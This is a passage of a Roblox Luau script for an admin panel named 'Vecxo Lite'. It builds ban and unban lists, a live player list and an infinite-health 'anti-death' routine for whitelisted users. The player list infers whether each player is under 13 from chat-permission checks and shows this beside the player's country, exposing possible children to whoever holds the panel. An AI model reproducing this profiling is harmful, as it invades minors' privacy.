	scrollingFrame.Size = UDim2.new(1, -10, 1, -44)
	scrollingFrame.Position = UDim2.new(0, 5, 0, 39)
	scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
	scrollingFrame.ScrollBarThickness = 6
	scrollingFrame.BackgroundTransparency = 0.1
	scrollingFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	scrollingFrame.BorderSizePixel = 0
	scrollingFrame.Parent = frame
	Instance.new("UICorner", scrollingFrame).CornerRadius = UDim.new(0, 8)

	local layout = Instance.new("UIListLayout")
	layout.Padding = UDim.new(0, 4)
	layout.SortOrder = Enum.SortOrder.LayoutOrder
	layout.Parent = scrollingFrame

	local bannedList = {}
	for userIdStr, _ in pairs(bannedPlayersTable) do
		local userIdNum = tonumber(userIdStr)
		if userIdNum then
			table.insert(bannedList, userIdNum)
		end
	end

	if #bannedList == 0 then
		local label = Instance.new("TextLabel")
		label.Size = UDim2.new(1, -10, 0, 22)
		label.BackgroundTransparency = 1
		label.Text = "‚úÖ No players are currently banned."
		label.TextColor3 = Color3.fromRGB(255, 255, 255)
		label.TextXAlignment = Enum.TextXAlignment.Left
		label.Font = Enum.Font.Gotham
		label.TextSize = 16
		label.Parent = scrollingFrame
	else
		for i, userId in ipairs(bannedList) do
			local name = GetUserName(userId) or ("User"..userId)
			local entryFrame = Instance.new("Frame")
			entryFrame.Size = UDim2.new(1, -10, 0, 40)
			entryFrame.BackgroundTransparency = 0.5
			entryFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
			entryFrame.Parent = scrollingFrame

			local headshot = Instance.new("ImageLabel")
			headshot.Size = UDim2.new(0, 36, 0, 36)
			headshot.Position = UDim2.new(0, 0, 0, 2)
			headshot.BackgroundTransparency = 1
			headshot.Image = "rbxthumb://type=AvatarHeadShot&id=" .. userId .. "&w=420&h=420"
			headshot.Parent = entryFrame

			local label = Instance.new("TextLabel")
			label.Size = UDim2.new(1, -110, 1, 0)
			label.Position = UDim2.new(0, 40, 0, 0)
			label.BackgroundTransparency = 1
			if permBannedPlayers[userId] then
				label.Text = i .. " - [‚õî PERM] " .. name .. " (" .. userId .. ")"
			else
				label.Text = i .. " - [üö´ TEMP] " .. name .. " (" .. userId .. ")"
			end
			label.TextColor3 = Color3.fromRGB(255, 255, 255)
			label.TextXAlignment = Enum.TextXAlignment.Left
			label.Font = Enum.Font.Gotham
			label.TextSize = 14
			label.Parent = entryFrame

			local unbanBtn = Instance.new("TextButton")
			unbanBtn.Size = UDim2.new(0, 60, 0, 28)
			unbanBtn.Position = UDim2.new(1, -65, 0, 6)
			unbanBtn.BackgroundColor3 = Color3.fromRGB(220, 53, 69)
			unbanBtn.TextColor3 = Color3.new(1, 1, 1)
			unbanBtn.Font = Enum.Font.GothamSemibold
			unbanBtn.TextSize = 13
			unbanBtn.Text = "Unban"
			unbanBtn.AutoButtonColor = false
			unbanBtn.Parent = entryFrame

			local unbanCorner = Instance.new("UICorner")
			unbanCorner.CornerRadius = UDim.new(0, 6)
			unbanCorner.Parent = unbanBtn

			local shadow = Instance.new("Frame")
			shadow.Size = UDim2.new(1, 4, 1, 4)
			shadow.Position = UDim2.new(0, -2, 0, 2)
			shadow.BackgroundColor3 = Color3.new(0, 0, 0)
			shadow.BackgroundTransparency = 0.8
			shadow.ZIndex = unbanBtn.ZIndex - 1
			shadow.Parent = unbanBtn

			local shadowCorner = Instance.new("UICorner")
			shadowCorner.CornerRadius = UDim.new(0, 6)
			shadowCorner.Parent = shadow

			unbanBtn.MouseEnter:Connect(function()
				local hoverTween = TweenService:Create(unbanBtn, TweenInfo.new(0.15), {
					BackgroundColor3 = Color3.fromRGB(248, 81, 95),
					Size = UDim2.new(0, 62, 0, 30)
				})
				hoverTween:Play()
			end)

			unbanBtn.MouseLeave:Connect(function()
				if zxc == true then
					local successTween = TweenService:Create(unbanBtn, TweenInfo.new(0.15), {
						BackgroundColor3 = Color3.fromRGB(40, 167, 69),
						Size = UDim2.new(0, 60, 0, 28)
					})
					successTween:Play()
				else
					local normalTween = TweenService:Create(unbanBtn, TweenInfo.new(0.15), {
						BackgroundColor3 = Color3.fromRGB(220, 53, 69),
						Size = UDim2.new(0, 60, 0, 28)
					})
					normalTween:Play()
				end
			end)
			unbanBtn.MouseButton1Click:Connect(function()
				zxc = false
				succ = false
				if bannedPlayers[userId] then
					bannedPlayers[userId] = nil
					zxc = true
					succ = true
				end
				if permBannedPlayers[userId] then
					unbanBtn.Text = "Processing..."
					local success, username = pcall(function()
						return game.Players:GetNameFromUserIdAsync(userId)
					end)

					if success and username then
						local unbanConfig = {
							UserIds = {userId},
							ApplyToUniverse = true
						}
						local unbanSuccess, unbanError = pcall(function()
							return game.Players:UnbanAsync(unbanConfig)
						end)
						if unbanSuccess then
							bannedPlayers[userId] = nil
							permBannedPlayers[userId] = nil
							succ = true
						else
							succ = false
							bannedPlayers[userId] = true
							permBannedPlayers[userId] = true
							notifyv3(player, "[Vecxo Lite]: ", "‚ùå Failed to unpermban " .. username .. ": " .. tostring(unbanError))
						end
					end
				end
				if succ ~= false then
					local successTween = TweenService:Create(unbanBtn, TweenInfo.new(0.2), {
						BackgroundColor3 = Color3.fromRGB(40, 167, 69)
					})
					successTween:Play()
					unbanBtn.Text = "Success!"
					task.wait(1.5)
					entryFrame:Destroy()
					zxc = false
					task.defer(function()
						scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
					end)
				else
					local errTween = TweenService:Create(unbanBtn, TweenInfo.new(0.2), {
						BackgroundColor3 = Color3.fromRGB(220, 53, 69)
					})
					errTween:Play()
					unbanBtn.Text = "API Error"
					task.wait(1.5)
					unbanBtn.Text = "Unban"
				end
			end)
		end
	end
	task.defer(function()
		scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
	end)
	for _, child in ipairs(frame:GetChildren()) do
		if child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("ScrollingFrame") or child:IsA("ImageLabel") then
			child.Visible = false
		end
	end

	local function unfoldGui()
		local rows, cols = 4, 6
		local blockWidth = frame.AbsoluteSize.X / cols
		local blockHeight = frame.AbsoluteSize.Y / rows
		local blocks = {}

		for r = 0, rows - 1 do
			for c = 0, cols - 1 do
				local block = Instance.new("Frame")
				block.Size = UDim2.new(0, 0, 0, 0)
				block.Position = UDim2.new(0, c * blockWidth, 0, r * blockHeight + blockHeight / 2)
				block.BackgroundColor3 = frame.BackgroundColor3
				block.BorderSizePixel = 0
				block.BackgroundTransparency = 1
				block.Rotation = 90
				block.Parent = frame
				block.ClipsDescendants = true

				local uicorner = Instance.new("UICorner")
				uicorner.CornerRadius = UDim.new(0, 6)
				uicorner.Parent = block

				table.insert(blocks, block)
			end
		end

		local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
		for i, block in ipairs(blocks) do
			local delay = (i - 1) * 0.03
			task.delay(delay, function()
				local tween = TweenService:Create(block, tweenInfo, {
					Size = UDim2.new(0, blockWidth, 0, blockHeight),
					Rotation = 0,
					Position = UDim2.new(0, ((i - 1) % cols) * blockWidth, 0, math.floor((i - 1) / cols) * blockHeight),
					BackgroundTransparency = 0,
				})
				tween:Play()
			end)
		end
		task.delay(0.03 * #blocks + 0.35, function()
			for _, child in ipairs(frame:GetChildren()) do
				if child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("ScrollingFrame") or child:IsA("ImageLabel") then
					child.Visible = true
				end
			end
			for _, block in ipairs(blocks) do
				block:Destroy()
			end
		end)
	end
	task.defer(unfoldGui)
end

local Players = game:GetService("Players")
local LocalizationService = game:GetService("LocalizationService")

local function GetFlag(code)
	if code:upper() == "XK" then
		return "üè≥Ô∏è" -- Kosovo no flag workaround
	end

	local flag = ""
	for i = 1, #code do
		flag = flag .. utf8.char(utf8.codepoint("üá¶") + string.byte(code:upper():sub(i, i)) - string.byte("A"))
	end
	return flag
end

local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local LocalizationService = game:GetService("LocalizationService")

local function showPlayerList(player)
	local existingGui = player:FindFirstChild("PlayerGui") and player.PlayerGui:FindFirstChild("VecxoPlayerList")
	if existingGui then
		existingGui:Destroy()
	end

	local gui = Instance.new("ScreenGui")
	gui.Name = "VecxoPlayerList"
	gui.ResetOnSpawn = false
	gui.Parent = player:WaitForChild("PlayerGui")

	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(0, 600, 0, 400)
	frame.Position = UDim2.new(0.5, -300, 0.5, -200)
	frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	frame.BackgroundTransparency = 0.1
	frame.BorderSizePixel = 0
	frame.Active = true
	frame.Draggable = true
	frame.Parent = gui
	Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

	local shadow = Instance.new("ImageLabel")
	shadow.ZIndex = -1
	shadow.AnchorPoint = Vector2.new(0.5, 0.5)
	shadow.Position = UDim2.new(0.5, 0, 0.5, 0)
	shadow.Size = UDim2.new(1, 30, 1, 30)
	shadow.BackgroundTransparency = 1
	shadow.Image = "rbxassetid://6014261993"
	shadow.ImageColor3 = Color3.new(0, 0, 0)
	shadow.ImageTransparency = 0.4
	shadow.ScaleType = Enum.ScaleType.Slice
	shadow.SliceCenter = Rect.new(49, 49, 450, 450)
	shadow.Parent = frame

	local titleBar = Instance.new("Frame")
	titleBar.Size = UDim2.new(1, 0, 0, 34)
	titleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	titleBar.BorderSizePixel = 0
	titleBar.Parent = frame
	Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0, 10)

	local title = Instance.new("TextLabel")
	title.Text = "[Vecxo Lite]: Player List"
	title.Size = UDim2.new(1, -70, 1, 0)
	title.Position = UDim2.new(0, 10, 0, 0)
	title.BackgroundTransparency = 1
	title.TextColor3 = Color3.new(1, 1, 1)
	title.Font = Enum.Font.Code
	title.TextSize = 18
	title.TextXAlignment = Enum.TextXAlignment.Left
	title.Parent = titleBar

	local closeBtn = Instance.new("TextButton")
	closeBtn.Size = UDim2.new(0, 24, 0, 24)
	closeBtn.Position = UDim2.new(1, -28, 0.5, -12)
	closeBtn.BackgroundTransparency = 1
	closeBtn.Text = "‚úï"
	closeBtn.TextColor3 = Color3.fromRGB(200, 70, 70)
	closeBtn.Font = Enum.Font.GothamBold
	closeBtn.TextSize = 16
	closeBtn.Parent = titleBar
	closeBtn.MouseEnter:Connect(function()
		closeBtn.TextColor3 = Color3.fromRGB(255, 100, 100)
	end)
	closeBtn.MouseLeave:Connect(function()
		closeBtn.TextColor3 = Color3.fromRGB(200, 70, 70)
	end)

	closeBtn.MouseButton1Click:Connect(function()
		closeBtn.AutoButtonColor = false
		closeBtn.TextTransparency = 0.5
		closeBtn.Active = false
		local fadeOutTime = 0.25
		local rows, cols = 4, 6  
		local blockWidth = frame.AbsoluteSize.X / cols
		local blockHeight = frame.AbsoluteSize.Y / rows
		local fadeTweens = {}
		for _, child in ipairs(frame:GetChildren()) do
			if child:IsA("TextLabel") or child:IsA("TextButton") then
				local tween = TweenService:Create(child, TweenInfo.new(fadeOutTime), {TextTransparency = 1})
				table.insert(fadeTweens, tween)
			elseif child:IsA("ImageLabel") then
				local tween = TweenService:Create(child, TweenInfo.new(fadeOutTime), {ImageTransparency = 1})
				table.insert(fadeTweens, tween)
			elseif child:IsA("ScrollingFrame") or child:IsA("Frame") then
				local tween = TweenService:Create(child, TweenInfo.new(fadeOutTime), {BackgroundTransparency = 1})
				table.insert(fadeTweens, tween)
			end
		end
		for _, tween in ipairs(fadeTweens) do
			tween:Play()
		end
		task.delay(fadeOutTime, function()
			for _, child in ipairs(frame:GetChildren()) do
				if child ~= closeBtn and child.Name ~= "UICorner" then
					child.Visible = false
				end
			end
			local bgFadeTween = TweenService:Create(frame, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
				BackgroundTransparency = 1,
			})
			bgFadeTween:Play()
			local blocks = {}
			for r = 0, rows - 1 do
				for c = 0, cols - 1 do
					local block = Instance.new("Frame")
					block.Size = UDim2.new(0, blockWidth, 0, blockHeight)
					block.Position = UDim2.new(0, c * blockWidth, 0, r * blockHeight)
					block.BackgroundColor3 = frame.BackgroundColor3
					block.BorderSizePixel = 0
					block.BackgroundTransparency = 0
					block.Parent = frame
					block.ClipsDescendants = true

					local uicorner = Instance.new("UICorner")
					uicorner.CornerRadius = UDim.new(0, 6)
					uicorner.Parent = block

					table.insert(blocks, block)
				end
			end
			local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In)
			for i, block in ipairs(blocks) do
				local delay = (i - 1) * 0.03
				task.delay(delay, function()
					local tween = TweenService:Create(block, tweenInfo, {
						Size = UDim2.new(block.Size.X.Scale, block.Size.X.Offset, 0, 0),
						Rotation = 90,
						Position = block.Position + UDim2.new(0, 0, 0, blockHeight / 2),
						BackgroundTransparency = 1,
					})
					tween:Play()
				end)
			end
			task.delay(0.03 * #blocks + 0.4, function()
				gui:Destroy()
			end)
		end)
	end)

	local minimized = false
	local minBtn = Instance.new("TextButton")
	minBtn.Size = UDim2.new(0, 24, 0, 24)
	minBtn.Position = UDim2.new(1, -56, 0.5, -12)
	minBtn.BackgroundTransparency = 1
	minBtn.Text = "‚Äì"
	minBtn.TextColor3 = Color3.fromRGB(150, 150, 150)
	minBtn.Font = Enum.Font.GothamBold
	minBtn.TextSize = 20
	minBtn.Parent = titleBar
	minBtn.MouseEnter:Connect(function()
		minBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
	end)
	minBtn.MouseLeave:Connect(function()
		minBtn.TextColor3 = Color3.fromRGB(150, 150, 150)
	end)
	minBtn.MouseButton1Click:Connect(function()
		minimized = not minimized
		if minimized then
			frame:TweenSize(UDim2.new(0, 600, 0, 34), "Out", "Quad", 0.25, true)
		else
			frame:TweenSize(UDim2.new(0, 600, 0, 400), "Out", "Quad", 0.25, true)
		end
	end)

	local scrollingFrame = Instance.new("ScrollingFrame")
	scrollingFrame.Size = UDim2.new(1, -10, 1, -44)
	scrollingFrame.Position = UDim2.new(0, 5, 0, 39)
	scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
	scrollingFrame.ScrollBarThickness = 6
	scrollingFrame.BackgroundTransparency = 0.1
	scrollingFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	scrollingFrame.BorderSizePixel = 0
	scrollingFrame.Parent = frame
	Instance.new("UICorner", scrollingFrame).CornerRadius = UDim.new(0, 8)

	local layout = Instance.new("UIListLayout")
	layout.Padding = UDim.new(0, 4)
	layout.SortOrder = Enum.SortOrder.LayoutOrder
	layout.Parent = scrollingFrame

	local function addPlayerEntry(plr)
		local plrFrame = Instance.new("Frame")
		plrFrame.Size = UDim2.new(1, -10, 0, 80)
		plrFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
		plrFrame.BackgroundTransparency = 0.5
		plrFrame.BorderSizePixel = 0
		plrFrame.Parent = scrollingFrame
		Instance.new("UICorner", plrFrame).CornerRadius = UDim.new(0, 6)

		local headshot = Instance.new("ImageLabel")
		headshot.Size = UDim2.new(0, 60, 0, 60) -- was 40x40
		headshot.Position = UDim2.new(0, 5, 0, 5)
		headshot.BackgroundTransparency = 1
		headshot.Name = "headshot"
		headshot.Image = "rbxthumb://type=AvatarHeadShot&id=" .. plr.UserId .. "&w=420&h=420"
		headshot.Parent = plrFrame

		local displayName = plr.DisplayName
		local username = plr.Name
		local statusText = ""
		local labelColor = Color3.new(1, 1, 1)
		local plrInGame = plr
		if plrInGame and table.find(whitelisted, tostring(plr.UserId)) then
			if username == "Reloxz" then
				statusText = "‚úÖ - { üëë OWNER }"
				labelColor = Color3.fromRGB(255, 215, 0)
			elseif table.find(exclusivewl, username) then
				statusText = "‚úÖ - { üõ°Ô∏è PERM }"
				labelColor = Color3.fromRGB(0, 255, 0)
			else
				statusText = "‚úÖ - { ‚è≥ TEMP }"
				labelColor = Color3.fromRGB(200, 200, 200)
			end
		else
			statusText = "‚ùå - { üë§ Player }"
			labelColor = Color3.fromRGB(200, 200, 200)
		end

		local playerage = ""
		if plr.Name ~= player.Name then
			local success, canChat = pcall(function()
				return game:GetService("TextChatService"):CanUsersDirectChatAsync(plr.UserId, { player.UserId })
			end)
			if success then
				if canChat then
					playerage = "13+"
				else
					playerage = "<13"
				end
			end
		end

		local accountAge = plr.AccountAge or 0

		local countryCode = "Unknown"
		pcall(function()
			countryCode = LocalizationService:GetCountryRegionForPlayerAsync(plr) or "Unknown"
		end)
		local flag = GetFlag(countryCode)
		local countryFull = flag .. " " .. (countries[countryCode] or countryCode)
		local ping = math.floor(plr:GetNetworkPing() * 1000)
		local infoLabel = Instance.new("TextLabel")
		infoLabel.Size = UDim2.new(1, -75, 1, -10)
		infoLabel.Position = UDim2.new(0, 70, 0, 5)
		infoLabel.BackgroundTransparency = 1
		infoLabel.TextXAlignment = Enum.TextXAlignment.Left
		infoLabel.Font = Enum.Font.Gotham
		infoLabel.TextSize = 14
		infoLabel.TextColor3 = labelColor
		infoLabel.TextWrapped = true
		infoLabel.Text = string.format(
			"%s - (@%s)\nUserId - %d | Country - %s | Whitelisted - %s\nAge - %s | Account Age - %d days | Ping - %d ms",
			plr.DisplayName,
			plr.Name,
			plr.UserId,
			countryFull,
			statusText,
			playerage,
			accountAge,
			ping
		)
		infoLabel.Parent = plrFrame
	end

	for _, plr in ipairs(Players:GetPlayers()) do
		addPlayerEntry(plr)
	end

	Players.PlayerAdded:Connect(function(plr)
		addPlayerEntry(plr)
		task.defer(function()
			scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
		end)
	end)
	Players.PlayerRemoving:Connect(function(plr)
		for _, child in ipairs(scrollingFrame:GetChildren()) do
			if child:IsA("Frame") and child:FindFirstChild("headshot") and child.headshot.Image:find(plr.UserId) then
				child:Destroy()
			end
		end
		task.defer(function()
			scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
		end)
	end)
	task.defer(function()
		scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
	end)
	task.spawn(function()
		while gui.Parent do
			for _, plrFrame in ipairs(scrollingFrame:GetChildren()) do
				if plrFrame:IsA("Frame") then
					local headshot = plrFrame:FindFirstChild("headshot")
					local infoLabel = nil
					for _, child in ipairs(plrFrame:GetChildren()) do
						if child:IsA("TextLabel") and child.Name ~= "Title" then
							infoLabel = child
							break
						end
					end
					if headshot and infoLabel then
						local userIdStr = headshot.Image:match("id=(%d+)")
						if userIdStr then
							local userIdNum = tonumber(userIdStr)
							local plr = Players:GetPlayerByUserId(userIdNum)
							if plr then
								local playerage = ""
								local success, canChat = pcall(function()
									return game:GetService("TextChatService"):CanUsersDirectChatAsync(plr.UserId, { player.UserId })
								end)
								if success then
									if canChat then
										playerage = "13+"
									else
										playerage = "<13"
									end
								end
								local displayName = plr.DisplayName
								local username = plr.Name
								local statusText = ""
								local labelColor = Color3.new(1, 1, 1)
								local plrInGame = plr
								if plrInGame and table.find(whitelisted, tostring(plr.UserId)) then
									if username == "Reloxz" then
										statusText = "‚úÖ - { üëë OWNER }"
										labelColor = Color3.fromRGB(255, 215, 0)
									elseif table.find(exclusivewl, username) then
										statusText = "‚úÖ - { üõ°Ô∏è PERM }"
										labelColor = Color3.fromRGB(0, 255, 0)
									else
										statusText = "‚úÖ - { ‚è≥ TEMP }"
										labelColor = Color3.fromRGB(255, 255, 255)
									end
								else
									statusText = "‚ùå - { üë§ Player }"
									labelColor = Color3.fromRGB(200, 200, 200)
								end
								local accountAge = plr.AccountAge or 0
								local ping = math.floor(plr:GetNetworkPing() * 1000)
								local countryCode = "Unknown"
								pcall(function()
									countryCode = LocalizationService:GetCountryRegionForPlayerAsync(plr) or "Unknown"
								end)
								local flag = GetFlag(countryCode)
								local countryFull = flag .. " " .. (countries[countryCode] or countryCode)
								--local isWhitelisted = table.find(whitelisted, tostring(plr.UserId)) and "‚úÖ" or "‚ùå"
								infoLabel.Text = string.format(
									"%s - (@%s)\nUserId - %d | Country - %s | Whitelisted - %s\nAge - %s | Account Age - %d days | Ping - %d ms",
									plr.DisplayName,
									plr.Name,
									plr.UserId,
									countryFull,
									statusText,
									playerage,
									accountAge,
									ping
								)
								infoLabel.Parent = plrFrame
							end
						end
					end
				end
			end
			task.wait(5)
		end
	end)
	local function unfoldGui()
		local rows, cols = 4, 6
		local blockWidth = frame.AbsoluteSize.X / cols
		local blockHeight = frame.AbsoluteSize.Y / rows
		local blocks = {}
		for _, child in ipairs(frame:GetChildren()) do
			if child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("ScrollingFrame") or child:IsA("ImageLabel") then
				child.Visible = false
			end
		end
		for r = 0, rows - 1 do
			for c = 0, cols - 1 do
				local block = Instance.new("Frame")
				block.Size = UDim2.new(0, 0, 0, 0)
				block.Position = UDim2.new(0, c * blockWidth, 0, r * blockHeight + blockHeight / 2)
				block.BackgroundColor3 = frame.BackgroundColor3
				block.BorderSizePixel = 0
				block.BackgroundTransparency = 1
				block.Rotation = 90
				block.Parent = frame
				block.ClipsDescendants = true

				local uicorner = Instance.new("UICorner")
				uicorner.CornerRadius = UDim.new(0, 6)
				uicorner.Parent = block

				table.insert(blocks, block)
			end
		end
		local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
		for i, block in ipairs(blocks) do
			local delay = (i - 1) * 0.03
			task.delay(delay, function()
				local tween = TweenService:Create(block, tweenInfo, {
					Size = UDim2.new(0, blockWidth, 0, blockHeight),
					Rotation = 0,
					Position = UDim2.new(0, ((i - 1) % cols) * blockWidth, 0, math.floor((i - 1) / cols) * blockHeight),
					BackgroundTransparency = 0,
				})
				tween:Play()
			end)
		end
		task.delay(0.03 * #blocks + 0.35, function()
			for _, child in ipairs(frame:GetChildren()) do
				if child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("ScrollingFrame") or child:IsA("ImageLabel") then
					child.Visible = true
				end
			end
			for _, block in ipairs(blocks) do
				block:Destroy()
			end
		end)
	end
	task.defer(unfoldGui)
end


local RunService = game:GetService("RunService")
local AntiKillConnections = {}

local function createAntiDeathProtection(player)
	if not player then return end

	local function setupCharacterProtection(character)
		local humanoid = character:WaitForChild("Humanoid", 5)
		local rootPart = character:WaitForChild("HumanoidRootPart", 5)
		if not humanoid or not rootPart then return end

		local originalJoints = {}
		local originalAccessories = {}
		local connections = {}

		if not AntiKillConnections[player] then
			AntiKillConnections[player] = {}
		end
		AntiKillConnections[player][character] = connections

		local function storeJoints()
			originalJoints = {}
			for _, descendant in pairs(character:GetDescendants()) do
				if table.find(AutoRespawn, player.Name) then
					if descendant:IsA("Motor6D") or descendant:IsA("Weld") or descendant:IsA("WeldConstraint") then
						originalJoints[descendant.Name] = {
							ClassName = descendant.ClassName,
							Parent = descendant.Parent,
							Part0 = descendant.Part0,
							Part1 = descendant.Part1,
							C0 = descendant.C0,
							C1 = descendant.C1
						}
					end
				end
			end
		end

		local function storeAccessories()
			originalAccessories = {}
			for _, accessory in pairs(character:GetChildren()) do
				if table.find(AutoRespawn, player.Name) then
					if accessory:IsA("Accessory") then
						originalAccessories[accessory.Name] = accessory:Clone()
					end
				end
			end
		end
		local function cleanup()
			if AntiKillConnections[player] and AntiKillConnections[player][character] then
				for _, connection in pairs(AntiKillConnections[player][character]) do
					if connection and connection.Connected then
						connection:Disconnect()
					end
				end
				AntiKillConnections[player][character] = nil
			end
		end

		humanoid.RequiresNeck = false
		humanoid.BreakJointsOnDeath = false
		humanoid.MaxHealth = math.huge
		humanoid.Health = math.huge

		storeJoints()
		storeAccessories()

		local healthConnection = humanoid.HealthChanged:Connect(function(health)
			if table.find(AutoRespawn, player.Name) then
				if health ~= math.huge then
					humanoid.Health = math.huge
				end
			else
				cleanup() 
			end
		end)
		table.insert(connections, healthConnection)

		local heartbeatConnection
		heartbeatConnection = RunService.Heartbeat:Connect(function()
			if not table.find(AutoRespawn, player.Name) then
				cleanup()
				return
			end

			if not (character.Parent and humanoid.Parent and player.Parent) then
				cleanup()
				return
			end

			if humanoid.Health ~= math.huge then
				humanoid.Health = math.huge
			end
			if humanoid.MaxHealth ~= math.huge then
				humanoid.MaxHealth = math.huge
			end

			local currentState = humanoid:GetState()
			if currentState == Enum.HumanoidStateType.Dead or
				currentState == Enum.HumanoidStateType.Physics or
				currentState == Enum.HumanoidStateType.Ragdoll then
				humanoid:ChangeState(Enum.HumanoidStateType.Running)
				humanoid.PlatformStand = false
			end

			if humanoid.RequiresNeck then
				humanoid.RequiresNeck = false
			end
			if humanoid.BreakJointsOnDeath then
				humanoid.BreakJointsOnDeath = false
			end
			if rootPart and rootPart.Anchored then
				rootPart.Anchored = false
			end
		end)
		table.insert(connections, heartbeatConnection)

		local stateChangedConnection = humanoid.StateChanged:Connect(function(oldState, newState)
			if not table.find(AutoRespawn, player.Name) then
				cleanup()
				return
			end

			if newState == Enum.HumanoidStateType.Dead or 
				newState == Enum.HumanoidStateType.Physics or
				newState == Enum.HumanoidStateType.Ragdoll then
				humanoid:ChangeState(Enum.HumanoidStateType.Running)
				humanoid.Health = math.huge
				humanoid.PlatformStand = false
			end
		end)
		table.insert(connections, stateChangedConnection)

		local descendantRemovingConnection = character.DescendantRemoving:Connect(function(obj)
			if not table.find(AutoRespawn, player.Name) then
				cleanup()
				return
			end

			if obj:IsA("Motor6D") or obj:IsA("Weld") or obj:IsA("WeldConstraint") then
				task.defer(function()
					if not table.find(AutoRespawn, player.Name) then return end

					if obj:IsA("Weld") and obj.Name == "AccessoryWeld" and obj.Part0 then
						obj.Parent = obj.Part0
					else
						local jointData = originalJoints[obj.Name]
						if jointData and jointData.Parent and jointData.Part0 and jointData.Part1 then
							if jointData.Part0.Parent and jointData.Part1.Parent then
								local newJoint = Instance.new(jointData.ClassName)
								newJoint.Name = obj.Name
								newJoint.Part0 = jointData.Part0
								newJoint.Part1 = jointData.Part1
								if jointData.C0 then newJoint.C0 = jointData.C0 end
								if jointData.C1 then newJoint.C1 = jointData.C1 end
								newJoint.Parent = jointData.Parent
							end
						else
							obj.Parent = character
						end
					end
				end)
			end
		end)
		table.insert(connections, descendantRemovingConnection)

		local childRemovedConnection = character.ChildRemoved:Connect(function(child)
			if not table.find(AutoRespawn, player.Name) then
				cleanup()
				return
			end

			if child:IsA("Accessory") then
				local storedAccessory = originalAccessories[child.Name]
				if storedAccessory and character.Parent then
					task.defer(function()
						if not table.find(AutoRespawn, player.Name) then return end

						local newAccessory = storedAccessory:Clone()
						newAccessory.Parent = character
						if newAccessory:FindFirstChild("Handle") then
							local handle = newAccessory.Handle
							local attachment0 = handle:FindFirstChildOfClass("Attachment")
							if attachment0 then
								for _, part in pairs(character:GetChildren()) do
									if part:IsA("BasePart") then
										local attachment1 = part:FindFirstChild(attachment0.Name)
										if attachment1 and attachment1 ~= attachment0 then
											local weld = Instance.new("WeldConstraint")
											weld.Part0 = handle
											weld.Part1 = part
											weld.Parent = handle
											break
										end
									end
								end
							end
						end
					end)
				end
			end
		end)
		table.insert(connections, childRemovedConnection)
		local jointLoop
		jointLoop = task.spawn(function()
			while character.Parent and player.Parent do
				if not table.find(AutoRespawn, player.Name) then
					cleanup()
					break
				end

				local expectedJoints = {"Neck", "Left Shoulder", "Right Shoulder", "Left Hip", "Right Hip", "RootJoint"}
				for _, jointName in pairs(expectedJoints) do
					if not character:FindFirstChild(jointName, true) then
						local jointData = originalJoints[jointName]
						if jointData and jointData.Parent and jointData.Part0 and jointData.Part1 then
							if jointData.Part0.Parent and jointData.Part1.Parent then
								local newJoint = Instance.new(jointData.ClassName)
								newJoint.Name = jointName
								newJoint.Part0 = jointData.Part0
								newJoint.Part1 = jointData.Part1
								if jointData.C0 then newJoint.C0 = jointData.C0 end
								if jointData.C1 then newJoint.C1 = jointData.C1 end
								newJoint.Parent = jointData.Parent
							end
						end
					end
				end
				task.wait(0.01)
			end
		end)
		table.insert(connections, {Connected = true, Disconnect = function() task.cancel(jointLoop) end})

		local childAddedConnection = character.ChildAdded:Connect(function(child)
			if not table.find(AutoRespawn, player.Name) then
				cleanup()
				return
			end

			if child:IsA("Accessory") then
				task.wait(0.01)
				storeAccessories()
			end
		end)
		table.insert(connections, childAddedConnection)

		local charAncestryChangedConnection = character.AncestryChanged:Connect(function()
			if not table.find(AutoRespawn, player.Name) then
				cleanup()
				return
			end

			if character.Parent ~= workspace and player.Parent then
				task.wait(0.01)
				if not character.Parent and player.Parent then
					character.Parent = workspace
				end
			end
		end)
		table.insert(connections, charAncestryChangedConnection)

		local humanoidAncestryChangedConnection = humanoid.AncestryChanged:Connect(function()
			if not table.find(AutoRespawn, player.Name) then
				cleanup()
				return
			end

			if not humanoid.Parent and character.Parent then
				task.wait(0.01)
				if not character:FindFirstChildOfClass("Humanoid") and character.Parent then
					humanoid.Parent = character
				end
			end
		end)
		table.insert(connections, humanoidAncestryChangedConnection)

		local rootPartAncestryChangedConnection = rootPart.AncestryChanged:Connect(function()
			if not table.find(AutoRespawn, player.Name) then
				cleanup()
				return
			end

			if not rootPart.Parent and character.Parent then
				task.wait(0.01)
				if not character:FindFirstChild("HumanoidRootPart") and character.Parent then
					rootPart.Parent = character
				end
			end
		end)
		table.insert(connections, rootPartAncestryChangedConnection)
	end

	if player.Character then
		setupCharacterProtection(player.Character)
	end

	local charAddedConnection = player.CharacterAdded:Connect(function(character)
		if table.find(AutoRespawn, player.Name) then
			setupCharacterProtection(character)
		else
			if AntiKillConnections[player] then
				AntiKillConnections[player] = nil
			end
		end
	end)
